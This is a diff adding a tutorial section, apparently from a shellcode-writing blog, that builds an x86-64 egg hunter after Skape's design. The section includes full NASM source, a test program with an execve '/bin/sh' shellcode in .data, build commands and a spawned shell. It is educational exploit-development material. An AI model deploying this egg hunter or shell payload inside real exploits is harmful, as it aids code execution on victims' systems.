@@ -103,11 +103,109 @@ Ok, with this knowledge we're set to write/understand the egg hunter!
 Implementation
 --------------
 
+I followed Skape's implementation with minor changes, the most significant one being that his shellcode was for x86 and this one is for x86-64. The shellcode is as follows (the egg is `0x50905090`):
 
-The smallest page size on x86-64 is 4 kB
+    global _start
+
+    _start:
+        xor edx, edx
+        xor esi, esi
+    skip_page:
+        or dx, 0xfff   ; minimum page size is 4 kB on x86-(64)
+    skip_byte:
+        inc rdx
+        lea rdi, [rdx+0x4]
+        push byte 21
+        pop rax
+        syscall
+        cmp al, 0xf2   ; EFAULT (-14)
+        jz skip_page
+        mov eax, 0x50905090 - 1   ; subtract so that the hunter does not find itself
+        inc eax
+        push rdx
+        pop rdi
+        scasd
+        jnz skip_byte
+        jmp rdi
+
+Essencially the shellcode searches the egg one memory page at a time. The address currently being checked is kept in RDX. `access(2)` is used to check whether this virtual address is mapped in the process's memory. If it isn't `-EFAULT` is returned and the code jumps to `skip_page`, which `or`s the lower bytes of RDX with `0xfff` and then increments RDX. In practice this results in skipping to the next 4 kB page (the smallest page size in x86-64). For example if the current address is `0x1234` this operation will result in `rdx = hex((0x1234|0xfff)+1) = 0x2000`, a nice, page-aligned address.
+
+If the current address is mapped, the egg value is moved into EAX and the [`scasd`][scas] operation is used to compare EAX with the four bytes starting at RDI. If the the comparison fails ZF is reset and we jump to `skip_byte` which increments RDX; and the process repeats for the next address. Otherwise if the egg was found the shellcode executes the larger payload by jumping to the address in RDI. Note that `scasd` increments RDI by four, so the egg is skipped and the code jumps directly to the shellcode. Also note that we are actually using `access` to check `rdx+4` and not RDX. This is because `scasd` compares 4 bytes, and if RDX points to an address near the end of a page and the following addresses are not mapped `scasd` could run into unmapped bytes which would result in a segmentation fault.
+
+You may have noticed one last detail: the value moved into EAX is one less than the value of the egg. Why? Because if the egg hunter itself contains the egg it might find itself instead of the desired payload. A simple way to avoid this is to decrement the value moved into EAX and then increment it in the next instruction.
+
+If you compare my implementation with Skape's you may notice they don't initialise RSI. However, I found that if `access` is called with an "incorrectly specified" mode (the second argument) it will return `-EINVAL` (regardless of the first argument), which the shellcode would gladly interpret as the page being mapped, which might not be true and the shellcode would crash. So I added this initialisation.
+
+Testing
+-------
+
+The simplest way I could think of to test the egg hunter was to write a simple program which had an `execve` shellcode in another section other than `.text` (I picked `.data`) and prepend the egg. If the hunter is working correctly it should find this shellcode and spawn a shell.
+
+    global _start
+
+    section .data
+
+        tag: dd 0x50905090
+
+    execve:
+        xor eax, eax
+        push rax
+        push rsp
+        pop rdx
+
+        mov rsi, 0x68732f2f6e69622f
+        push rsi
+        push rsp
+        pop rdi
+
+        push rax
+        push rdi
+        push rsp
+        pop rsi
+
+        mov al, 59
+        syscall
+
+    section .text
+
+    _start:
+        xor edx, edx
+        xor esi, esi
+    skip_page:
+        or dx, 0xfff
+    skip_byte:
+        inc rdx
+        lea rdi, [rdx+0x4]
+        push byte 21
+        pop rax
+        syscall
+        cmp al, 0xf2
+        jz skip_page
+        mov eax, 0x50905090 - 1
+        inc eax
+        push rdx
+        pop rdi
+        scasd
+        jnz skip_byte
+        jmp rdi
+
+
+    $ nasm -felf64 access.nasm
+    $ ld access.o -o access
+    $ ./access
+    sh-5.0$ whoami
+    goncalor
+
+A final comment: I don't think egg hunters are as useful in x86-64 as they were in x86. The address space is now 2^64, so it's just too large to search it all in useful time. I tried to write a C program to test the egg hunter and the egg was placed in a page starting at address `0x555555554000`. On my machine I was able to search about 65 million pages/second. At this rate, reaching the address fot the egg would take more than 16 days!
+
+If we know approximately the address range where the egg is tipically placed one possible workaround would be to initialise RDX with an address closer to that range, instead of 0.
+
+Thank you for reading. I hope you learned something.
+
 
 [skape_egg_hunter]: https://web.archive.org/web/20190516191849/http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
 [man_2_access]: https://linux.die.net/man/2/access
+[scas]: https://www.felixcloutier.com/x86/scas:scasb:scasw:scasd
 
 ----
 
